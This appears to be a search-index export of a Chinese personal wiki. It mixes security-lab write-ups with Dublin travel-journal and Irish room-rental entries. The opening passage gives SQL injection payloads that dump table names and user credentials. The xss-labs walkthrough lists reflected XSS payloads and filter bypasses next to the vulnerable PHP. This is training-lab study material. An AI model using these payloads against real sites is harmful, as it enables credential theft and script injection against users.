information_schema.tables where table_schema=database() --+-- 拆解id=-1&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ Your Login name:emails,referers,uagents,users Your Password:3 注入 联合查询 123?id=-1&#x27;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+?id=-1&#x27;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ 报错注入 123?id=1&#x27;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+?id=1&#x27;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ — 未完待续","tags":[null],"categories":[null]},{"title":"Dublin Tour","path":"/wiki/Travel Journal/Dublin Tour - 序言.html","content":"4726bbc9ea369f744cf597d75ccaf73bb293b26770222225929a6a2c76bb044f6cd7e4138d9b09088a5ef5d501e56e461cf00656e90d8cf35e590b5f50ed2ceffe573b18dfdd91ded1ec5c2b77379ec8368522a6eaa56543b1eac0c179d4cea98b905aa0e723a8db0756f75733403f6195506d3cdc00fcede1e3ca93785a227e083bd67a9875a632260b2c8774ce2fd1cdfab533056aa24ab097092827c9853d56171738cca107e43cb490f748ef36db539f75c710deaf6f8bee511c122667286d0d4567ee0d30c152e98877e76cfd5438a98b8c64cc03be8f4cc3d0d727fa1d5ed486ca15a6b533c094237f84979fec2801079dfa09a4a001a17046fd25d5298c02de316f354dbb651460283dfda04dd48812a1f79698f67afab04e6d6547b97199dcc0c3bb76286b82430367397c31c4a8b7bb47d449c2a5df77b3a9e3fc7e0de361249fcd866170ec9a31b62c620164a0c509355dc9e238729b9897f8bd431aec7b0bfb4ea48b9b3e11f4effcabafc9732895c666c514352ad805e9e9182369c9c30353c1469fdaa1cb5251f2cd952837f11c3ea0a173a85714ca4296a10197366e95bcc468ce931fd86a46e9f677359c8e741f2089598fb29ac9acf164c6f75b1a4657a003560b20b64bb31df1ec3f55dad42f95cd51a4d33262ffe481a8a18e732f485e82b6a6d3a09727da28fa3ff134d90d2578590c2720fffd6be524b707d8bd8b0f3f511280d041d3f6e76330daded10bcd5a88e000a98d886faf9fe3e0a7622d5e59e4c0756ba62dfb26365b23a3619f3a06a2a183b62be6160238eb1975cc9e98048269ca6ae6d0c130b9436dee10c647e6380639800f4d1de17f6fea9e9c0f304e469f159363bf33c7b7e06933b5043cd29c7550e0301aa5f633a698a459d3f44624ca578edc61067f5e39ddcb85b406f3580406b85f3daee5196017df0023e2ea866fbda4123990a549dada9a9ade6e0a4c17d96a13a6c2824ebe9e1f2528149eeda6634998682410585cf8882eb11949087403254e74f6ad4736d6393ffcfcd451b072deca6ad9a084766545ee4b038bc94a4381808b5cd62ae78cb5f549c395ae092fbafec01fe2b567e30dbb209c7214338321c0fa279da6029f52cbc136bbb4ca729f987289a0b334b5bcc881019e370ef12600f35811c1c82dfc5c7ade568f7fbdaa570d1b56556e25ca08726f6baf4a8161103a756337aa52c7b0b15db9170509c544e905f5b6d4c1ac4e5606ed4abde7732021fdb5dabf0e449ee2e6d50674b1495d01115e16a84c6f848dc33931b62758e0ea8fc4b64d8fbc5905ef6c21ddc0b1f2ed65238f187e43bf142418090e547c17d57c4f01d5789cb1705041b4954c65ffb10b233aed6e58a352048044d2249bdc641405ce99d452745c74eebe0a7b4de6b3418423ce3ba25c745ba88e42b0ff933594c81e224515624d1b0cf0975dc7ac9ce00e66e8459b7926cae1c8393010220671b5a3a63397c78d553a4f548bae0923f8784a42a76c8afc11642167503768ff7e99d474d229a07a29e609f122ddfbc7ea4a82e34596e8fa8867d6d34e108be7b0dcee189ca6205a57bdd790df717b0db0363bfb1ca93dd4c0908f93d0ad5436570bff685be8621676ba48405d5d448aede009339c49ebd3fa8c55d5fc4fc976ca70208bc76bf6ad2421bc516a434fe5aa37d89715d8314af3d6f50823f9353a4276a4401fa1e137fd49132d8a13e796e0423275911b967ef9391ed283f97b6eb9c1156f24fe2affdad69e515daade75a44f43512c21a42025e80bf5c4a971e6068cd462cbfcbb8d266aa4613a64e1928b1a142f5e477350b51b9d6e9e3b1469eba15e4f9cd9a4e33cd608f17b5e3ca513ca95bbb9d6657e56c76a7df17bd59b54f7ab7c8456182424c42208f030f38c226fc33fcb59b6472016c57dd0545359fc9a0ed5bc6b421ebbe45cf5036f4086b458919585030c512bf4b4426213042c36c3923d9c2f97e09792aaeb4cd084ff1219848977a75fb8fb5eff286cbcd3f0b169b78d88cdc9a88eb0f6c39c47399ac2a0066444ff05a8d370016da7bf9a2b787da86b7c78cb2f98db993535f68e551f10db826ef238efc5805cbea9fef5bf4fab64992781b65e25f8e1992e0e0997f880ad15eb92444de235f2a8f0e4ee3c0b231f5e8196a6f577d4ba36d9d001356ad94f4b180ddb7fe99693198d894908ecc782815941d353bbf9e6644bbfac2cc7b42500b1484d1cbe20b775ec40ecbc97c7839e4a07e859c4ceae9586ca68fb6d429e9e579d0285777ebdd5a2c757874d17e71d4496755cb46e281a5d496aa8c6a276476a2e4c4f24b40b8180b2a96b70c1f2b00db233c447abb4a083d7ff5a0a9735cdad69d8c1b9affa840ba75085d8b7cec9a3f2f5d3679c7c81ab6c81a4c841c3574472c70a492f26df89269eb2bb7cc401a49868de20b7bc172848b56736e8d3b44d3e8f32062a6a928e8bd4c8b49be485526e4305bbddc664d0e21b4786dcb98f2273eb678aeb55b96db658fa75f7200d723501fe14ef222f6198f6914e520bc5713b7df2948b97cad79a150fc8477d1443d7e81878fa86d37d8d677b13f1ec9ac387eb6bf8aea51ddf1213231fedef6b42456c6edae834b9941f4a066356e7901b73e4e3cbb1a7e3f8fba4ca47abae90aa1f7c4439372ac29427c03597ef87b5953e8831f2c0ee117123eeca9e581b06191f6476d78e0d505c856500b451467cdbcbecc3a70cfa102ea1516300f8c82d3a959a2a4404c886ef1e0d0f656db1a8c4bc96f6c65980c2f8dc1fb6ff3ae1da8a22df6299d20e39123f6722311cbe3431c099b73c944845065bea26128d096f591ba75526c90a5ab5d00689b4e38f23ac2aa3b91ef7d7f0687bd0deb86e0221dcf55a0c6c9c923a898b76aade331407afb1584efa988e055e5295bed537a39a89c4b77fb4ed1ceba9fe7349a2b0ea8daa71538aa2b3d82b1648323dc36dd695d86f15a7b7a5b76b57c120d614cfbd3167c82030467d22366970538d63699cfc2b6712c1598a40434203f982646d2593ac628e6b3a40c913c39a029431478d073493aea2bd24e0653f9b2344aaa0d398d37e8c8f1c01cf6dca4a6e839d1f2d6452e82d2a03a4f444978399cac779177a74c4296343f894956803fb0eaddf1111de024b65e4b8eeeb2da1ad8ec65da4fe27e83068acc33ad8b9ecda76cffec24345bf118b072a7a61c7fe5c61a028f0842033cb2bc2f9a31117a9471a7bd2c8f1d18a1b76b058172121e4a7415d33812782b9e72edfe0144fef2c5b9d3abe86143b77e82d1939a4e0a16e9e25514544ab004778fed9bfcbfb0cdaf7d45271ee95375039a6a65977470923e14e6af11fbaf0c8f0b89f5a7e19b1e02728074db374658aab218ae51374fbfd7768f42beaf943d4f84d17614f3231753ac0340c2758ee536bb3b3322c6cc18a628cd92a91d87f78fa4af9bcb7a4f276cb59c92a09d99ae71cb9cd38bc04d0bcf2ebd70787766d236452a0c3c7376f145de96013b04820a6f192221152582197056f9fd0e9dd22e26602a26fe5f72ce78fb140da0980e5b470e187475635730084d706280e35145226a1d0437569b258f11b416729297f61db7428c4e15155971d20cb0b6b58ddc789312da9be67ef9d090cf92590858c6606a231119276ef73d837f9464b5a6ae49e47535bc740cd0e0e69ec43582169703c4c1757286a11bba38b17b7b2f5a60fc174ddde86dfcb7d77306cda963843fde2f779101e73469ee7193e3b361959cc5a6fcea2da11a9c579f98c933965ae4407e4c39ec862c8de14ba141f48bda4f45402f624e860fc5bd3099c34f701e293a41432fe25edd960226afcedd1cba0808d2cacfc1234902e281f8f5ae43eda803615787a7f27871ab958dc8f7c323c5c7adb4dcba335186ef0fe71f9cd515a25d8869360dfe7a4611ec8b8df0e52064d31390cea2781fc329f24272002e45af915d704b8aea37b625f25ea8bfcaa9159c72c40fc98286140907861714e20d7e483937d99c507eba45614840687a8e5fcddb6d47cc8854c0dc8ad91afbd7e0c6f4697b8ca638bbf5a88183fae0543562dbb9d356395c2760e7996008f87222a77f3251c05ca8d6c9d353c938d9d668dc711feff11a15e09eb30fa2bf036fbd8db0fd56d48d837fe3cf1d01b1af6ccc6b9bc567289a1a1274162ce53127e377929cf21c356499dc7a2000aa9192bf9a7ba7aad279d65f293e3a5cd061489f8c06aa760234f8eeddd3170dfba6a1570cefd699cb58da2e37594291419b791701afea2aa0a65d200880c7e96e19ad661299b005c944d8123197fd3c03ff89ac03a13d09ff6f6061bd54d37347085269f42b99801495f672a0b6095d29c5ef73435e4e538b7531fead2e568b7fd291aaac4eac8dcee215a911e1fc060a04b0325ec7d9475e2ffc1c1817a71659a7c9afbe444ccb794b9619655ed0aca603a4ba4233dc50c497377d11d5232e7e69b63a6f86c3bfc6517120689e61abe699a177a9b44874ccb229c1b152f244062395070213b23622603dc3d5187abdeeb0e89cca7ec942c9c1c5d761b4711b85aa5497af1a3270a1013ae5c93a369e3ea9a41b4bff969a2c869c433395f24b4c67706187b2faad02b77ecf6a602e067c6050d3465aa65df1e66970e13fce0ce66447eaf863e58fca4d61536f7d889d1ba7c707dce7f2bd4eeac0c979268fedb2f5affd885d2820c5132360e0c445abec798e27140434a2c5db55ab2e4510fd7d758c0 欲救生快活，须下死功夫","tags":[null],"categories":[null]},{"title":"xss-labs","path":"/wiki/XSS-and-Security-Labs/xss-labs.html","content":"do0dl3/xss-labs: xss 跨站漏洞平台 (github.com) level 1 观察地址栏得知是GET请求，参数是name，值为test 修改参数值定位位置，发现是在 h2标签内，判断为反射型xss 于是直接在把name参数赋值为： 1&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; 从浏览器观察直接弹出来了，查看一下源码，发现有一个str变量，值是name，同时str变量又被放在了h2标签中，且没做任何过滤处置。 12$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;; level 2 从地址栏观察URL发现依旧是GET方式来传递参数，不言而喻是反射型XSS 使用第一关的&lt;script&gt;alert('xss')&lt;/script&gt;，发现并没有出现弹窗，查看页面源代码，发现在h2标签中，&lt;script&gt;的&lt;&gt;被HTML实体化了 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 但 input 标签中的 value 参数没有被 HTML 编码，于是用&quot;&gt;分别闭合value属性和input标签，最后用//注释后面的&quot;&gt; 12// payload&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;// 最后在 less-2.php 中查看，发现标签h2之所以被编码，是因为有htmlspecialchars()函数，换言之在网页上输入的字符会经过htmlspecialchars()函数对其进行 HTML 实体才会展示在页面上。 htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。 1234$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str.&#x27;&quot;&gt; 页面源代码 闭合在标签外构造 XSS level 3 修改参数值定位具体位置，发现和 level 2 是一样的，在h2和input标签中 顾忌到会有编码之类，使用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，然后 Ctrl + U 查看页面源代码。果不其然，与 level 2 不同的是，这关h2和input标签中的str变量皆难逃被编码之命 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 因为过滤了&lt;&gt;，这说明不可以用新标签，只能在标签内通过'闭合前面的属性的方式，为后面新增属性来绕过，与此同时想到的是“鼠标事件” 123// 用 &#x27; 闭合 value 的值，新增点击事件，在 input 框中去点击一下即可触发// 根据源码，闭合需用单引号&#x27; onclick =&#x27;javascript:alert(1)&#x27;// 1234$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; 页面源代码 新增属性构造 XSS level 4 修改参数值定位具体位置，依旧是在h2和input标签中，用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，查看页面源代码，发现h2标签的参数依旧被 HTML 实体，仍然是&lt;&gt;字符 但与之前不同的是，input标签中的value属性的值，没有出现&lt;&gt;字符，所以还是用闭合属性新增鼠标事件的方式来绕过 1&quot; onclick =&quot;javascript:alert(1)&quot;// 最后在 less-4.php 中查看，出现了str_replace() 函数 str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); --&gt; 在 str 变量中，将&lt;&gt;字符替换为空 htmlspecialchars() 函数 --&gt; 把一些预定义的字符转换为 HTML 实体。 123456$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt; 页面源代码 点击事件 level 5 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 script --&gt; scr_ipt 尝试&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 onclick --&gt; o_nclick 于是换一种思路，用&quot;&gt; 来闭合 input 标签，利用a标签的href属性可以执行 JavaScript 伪协议的特性，绕过众多检测 1234&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//// 看到还有一种方式，可直接触发&quot;&gt;&lt;iframe src=javascript:alert(1)&gt; 最后在 less-5.php 中查看，出现了strtolower() 函数 strtolower() 函数 --&gt; 把字符串转换为小写，赋值给str变量，这样大小写绕过就失效了 str_replace --&gt; 加入了_破坏完整的字符 123456$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt; 测试一 测试二 JavaScript 伪协议 level 6 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，发现在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 尝试点击事件&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 试一下伪协议&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//，完整的href被_断开了 于是使用*大小写绕过* 12345// 点击事件大小写绕过&quot; ONCLICK =&quot;alert(1)&quot;//// 伪协议大小写绕过&quot;&gt;&lt;a HREF=javascript:alert(1)&gt;xss&lt;/a&gt;// 查看 level6.php，可以看到 str_replace 函数分别破坏了&lt;script、on、src、data、href等元素。h2 标签处做了 HTML 实体 123456789$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt; level 7 通过测试，发现 input 标签的 value 属性的值 script、on、href被直接替代为了空，h2 标签依旧是 HTML 实体了 于是通过**双写绕过**的方式去绕过检测 12345678// script&quot;&gt;&lt;scrscriptipt&gt;alert(&#x27;xss&#x27;)&lt;/scrscriptipt&gt;// href 和 script，伪协议&quot;&gt; &lt;a hrhrefef=javascscriptript:alert(1)&gt;1&lt;/a&gt;//// 点击事件&quot; oonnclick =&quot;javascscriptript:alert(1)&quot;// 查看 level7.php，可以看到 str_replace 函数分别把&lt;script、on、src、data、href替代为了空 h2 标签处做了 HTML 实体，strtolower()函数把字符串转换为小写 123456789$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt; level 8 定位一下，第一个参数在 input 标签的 value 属性中， 第二个参数在 a 标签的 href 属性中 通过测试，发现在 input 标签的 value 属性中&lt;&gt; &quot;被 HTML 编码了，a 标签的 href 属性把script、on、src、data、href用_截断了，同时&quot;被 HTML 编码了 使用大小写绕过也失败了，说明有 strtolower 函数。 因为第二个参数在 href属性中，而href属性支持构造伪协议，但script被_所限制，于是尝试用编码的方式去绕过 123javascript:alert(1)&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; HTML 编码 HTML 编码 level 9 定位参数，第一个参数照旧，第二个参数还是在 a 标签的 href 属性中 用javascript:alert(1)测试，a 标签的 href 属性的值显示“您的链接不合法” 一般而言，href 属性是要填 URL 的，那就补上一个https://www.google.com 输入javascript:alert(1)//http://www.baidu.com，从页面源代码处看到script被_截断了，那就 HTML 编码一下 12java&amp;#x73;cript:alert(1)//http://www.baidu.com// ｓ--&gt; &amp;#x73; 从 level9.php 可以观察到，如果没有http://字符，会输出链接不合法 1234if(false===strpos($str7,&#x27;http://&#x27;))&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;; &#125; level 10 从 URL 处输入测试参数，然后 CTRL+U 查看页面源代码发现有三个 input 标签，且 type=“hidden”，也就是隐藏表单。 把三个 input 标签的类型修改为 text，看在页面的显示情况 1234// 发现页面出现文本框，t_sort，这证明可对其进行突破text&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;// 出现文本框后可直接注入 XSS 代码&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) 从源码看把&lt;&gt;替换为空了，这恐怕只能在标签内部通过新增属性的方式来答题了 123456789$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt; 隐藏表单 点击 input 框触发 xss level 11 查看源代码发现 t_ref 的 value 值为上道题的 URL，由此判断 value 值就是 referer，referer 用于告知服务器用户的来源页面，所以这道题直接篡改 referer 就可以了 1referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) 页面源代码 点击 input 框触发 xss 源码 level 12 CTRL+U 查看源代码发现 t_ua 的 value 值为 User-Agent，也就是用户代理，通常标识浏览器、及其版本号及其主机操作系统。 1User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) User-Agent 点击 input 框触发 xss 源码 level 13 CTRL+U 查看源代码发现 t_cook 的 value 值为call me maybe?，使用浏览器插件 Cookie Editor 查看 cookie 的值与之相似，于是判定 value 值就是 cookie 1user=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) 对比查看是 cookie 修改 cookie 点击 input 框触发 xss 源码 level 14 网页一直在响应，最终以失败告终，查看源码发现原链接已经失效 这关主要考察Exif，Exif 记录着照片的属性信息和拍摄数据，可以更改图片的参数把一张恶意的图片传到可执行该信息的网站 level 15 查看页面源码，最底部有一行 span 标签，class 属性是ng-include 1&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt; 查询了一下得知是前端框架 angular js 里面的，含义是文件包含 于是可以把本地文件level1.php包含起来让其执行 XSS 1?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27; level 16 用&lt;script&gt;alert('xss')&lt;/script&gt;测试，查看页面源代码，发现参数值在 center 标签中，而用于构造 XSS 的script、/、空格被替换为了&amp;nbsp; /被编码这意味着像是&lt;&gt;&lt;/&gt;需要闭合的标签用不了，所以想到了&lt;img&gt;这种自闭和的标签 换行符 --URL编码后--&gt; %0a 123456789// 直接输入发现“空格”被替换为了 &amp;nbsp; 因此考虑用 %0a 即换行符绕过空格&lt;img src=”1” onerror=alert(‘xss’)&gt;&lt;img%0asrc=1%0aonerror=alert(1)&gt;&lt;imgsrc=”1”onerror=alert(‘xss’)&gt; URL 解码 插入 XSS level 17 在 URL 中填上参数?arg01=1111&amp;arg02=2222，然后查看页面源代码，发现有个 embed 标签，填入的参数在 src 属性中进行了拼接 &lt;embed&gt;标签就是引入一个swf文件【SWF格式是动画软件Flash的专用格式】 12&lt;!-- 查看页面源代码 --&gt;&lt;embed src=xsf01.swf?1111=2222 width=100% heigth=100%&gt;&lt;h2 align=center&gt; 1234?arg01= onclick&amp;arg02=alert(‘xss’) //&#x27; &gt; onmouseover=alert(1) 火狐、Chrom、Edge 等浏览器已不支持 flash，所以不会弹窗 level 18 和 level 17 是一样的 level 19、20 IE 浏览器和 flash 均已被历史淘汰","tags":[null],"categories":[null]},{"title":"一些文化碎片与都柏林夏日（番外篇）","path":"/wiki/Travel Journal/印度走马观花：一些文化碎片与都柏林夏日（番外篇）.html","content":"我对印度的初印象，主要来自几部令人印象深刻的电影。《三傻大闹宝莱坞》、《摔跤吧！爸爸》、《调音师》，每部都让我看到了不一样的印度。特别是片中的人物，热情似火，仿佛拥有无尽的活力，一派欣欣向荣之景。这不由得让我想起，日本作家芥川龙之介，小说罗生门的开篇：”你还有旺盛的生活欲望吧？“。是的，我的欲望已然散去，徒剩下骷髅。 除了电影，印度咖喱也享誉盛名，风味独特。另外，印度食物的烹饪技法，和美国那些工业化的快餐相比（炸鸡、炸薯条），印度菜更注重还原食材的本真，这让我觉得更健康，也更认同这种饮食理念。 当然，印度现存的种姓制度我了解不多，所以不敢妄加评论。 另外，印度各个地区都有自己的方言，很多人之间都听不懂对方在说什么，但用英语交流却完全没问题。这可能也是为什么那么多印度人在IT行业发展得不错吧。印度还有条著名的恒河，被称为&quot;母亲河&quot;，听说是印度文明的发源地。 最后，我想谈谈关于歧视的问题。我曾一度认为中国没有基于肤色的歧视，因为中国是一个以单一民族（少数民族极少）为主的国家。但实际上，无论是对少数族裔还是外国人，偏见都是存在的，尤其是互联网放大了人性的恶。所以，平等相处需要我们每个人的努力。 把一个人看作一个国家，无异于灭杀其人性。这种做法是对个体独立性的否定，也是对人性的践踏。 上次在都柏林与印度朋友 Pradyumna 见面，他展现出对科技的兴趣，让我印象深刻。不仅熟练使用 GPT，还告诉我 VIVO 在印度非常受欢迎。最让我忍不住拍腹大笑的是，他说，他们用 Edge 浏览器下载 Chrome！在他看来，Edge 浏览器唯一的用途似乎就是下载 Chrome。那天，我们从市中心新开的迪卡侬一路逛到圣斯蒂芬绿地，又去了商场和艺术展，整个旅程都非常愉快。最让我难忘的是，对方那种自然而然的相互尊重，这真是一段美好的回忆。 对了，还有 Bray 航空展，让我第一次感受到都柏林如此缤纷多彩的生活。可能也和夏季有关吧，到了冬天大家可能就不怎么出门了。 轮船在缓缓驶来 航空表演之爱心","tags":[null],"categories":[null]},{"title":"爱尔兰租房全攻略：旅行寻房记","path":"/wiki/Travel Journal/爱尔兰租房全攻略：旅行寻房记.html","content":"计划在爱尔兰旅行，住宿是首要解决的问题。本文将结合我的个人寻房经验和一些网上搜集到的实用信息，为大家提供一份详细的爱尔兰租房攻略，希望能帮助大家少走弯路，顺利找到心仪的落脚点。 租房前的灵魂拷问 在开始找房之前，不妨先问自己几个问题： 爱尔兰什么时候好找房？ 对于旅行者来说，避开9月开学季的高峰期可能会更容易找到合适的房源。但如果你的行程包含9月，那就要做好提前准备了。 想住在哪里？ 都柏林市中心生活便利，但租金较高，且治安混乱。如果预算有限，可以考虑稍远一些但交通便利（靠近luas且周边有Aldi、Lidl）的区域。 住酒店是否可行？ 强烈不推荐！都柏林酒店费用约200-500欧，折合人民币一晚上最少也1600￥，如果是不差钱的也就不必再看本文章了，如果你旅游时间超过半个月，强烈建议找短租。 短租房源哪里找？ Line群（如台湾人/日本人群组）： 这种群组通常是内部消化房源，价格可能比市场价便宜，但需要人脉关系。 微信、小红书： 这两个平台上有不少华人发布的租房信息，但要小心甄别真假。 我的求租信息（英文版） 以下是我在各大平台发布的求租信息，供大家参考： 🌟 Searching for a Room in Dublin 🌟 Hello, I’m looking for a room in Dublin for a 3-month stay. Here are my requirements: Move-in Date: [你的入住日期] Lease Term: 3 months (flexible) Housing Requirements: I have a regular schedule, do not disturb others, do not smoke or host parties, and will treat the property with respect. Location: I’m interested in areas along the Luas Green Line, but open to other convenient locations. Important Note: I will not make any payments without viewing the property first. If you have a suitable property, please contact me! WhatsApp: +353[你的WhatsApp号码] Thank you! 邮件问询模板 Dear [房东姓名/Sir/Madam], I hope this message finds you well. I came across your rental listing and am very interested in the [房型] available in [区域]. I am planning a 3-month trip to Ireland and your property seems like a great fit. [简要自我介绍，如旅行目的、个人习惯等] I plan to move in on [入住日期] and stay for approximately 3 months. Here are a few further questions I have: Are you the landlord of the property? How is the rent paid, and through what method? [其他问题，如关于bill、室友等] I would appreciate it if you could provide more details. I look forward to your reply! Additionally, I have WhatsApp, so please feel free to add me if it’s convenient: +353[你的WhatsApp号码]. Best regards, [你的名字] 租房渠道大盘点 Facebook小组： DUBLIN- Ireland Housing, room to rent/apartment, sublets and house for sale Rent in Dublin ACCOMMODATION IRELAND …（其他相关小组） 网站： Homestay.com：适合短期住宿，房源稀少。 Rent.ie：房源较贵。 Airbnb.cn：价格高，房源质量参差不齐，但可以作为短期过渡的选择。 Daft.ie：爱尔兰最常用的租房网站，房源多但竞争激烈，需要提供一些个人资料。 Line アイルランド情報交流板 日本相关网站（已在前面列出） 日本人在爱尔兰租房的吐槽（可参考） 若者泣かせのアイルランドの家探し sekai-ju.com/life/irl/life/ire-rent/ (2019年) samurai-kokou.com/2023/07/04/post-1085/ 租房注意事项 位置： 考虑公共交通、生活便利性和个人喜好。提前熟悉地形图非常重要！ 可以利用Google Maps等工具，了解不同区域的交通情况、周边设施（超市、公园、餐厅等）以及到主要景点的距离。 交通： 查看附近的公交车、火车或轻轨（LUAS）线路。 区域： 个人推荐南边（如果预算允许），如Ballsbridge, Donnybrook, Sandymount, Ranelagh, Rathmines , Rathgar, Terenure, Dundrum等，这些区域通常比较安全、安静。 房型： 根据需求选择独立公寓、合租房或单间。 房屋设施： 查看房屋是否提供家具、电器、暖气等。 租赁合同： 仔细阅读合同条款，尤其是租期、押金退还条件等。 租房平台： 通过Daft.ie和Rent.ie等可靠平台寻找房源。 房东或中介： 确保房东或中介合法可信。 安全性： 考察租房区域的安全性。 能源效率： 检查房屋的能源评级（BER）。 看房时要问的问题 房租如何支付，支付方式，合同期限？ 押金是多少，退还条件？ 房租是否包含bill？ 检查淋浴的水压和热水。 可以自由使用淋浴间和厨房吗？ 公共区域清洁和垃圾倒运是否有责任制？ 有冰箱如何分区、宵禁等规定吗？ 市中心半小时步行圈 都柏林区域图","tags":[null],"categories":[null]},{"title":"Portswigger 靶场之“访问控制漏洞”","path":"/wiki/portswigger/access-control.html","content":"Access control vulnerabilities All labs | Web Security Academy (portswigger.net) 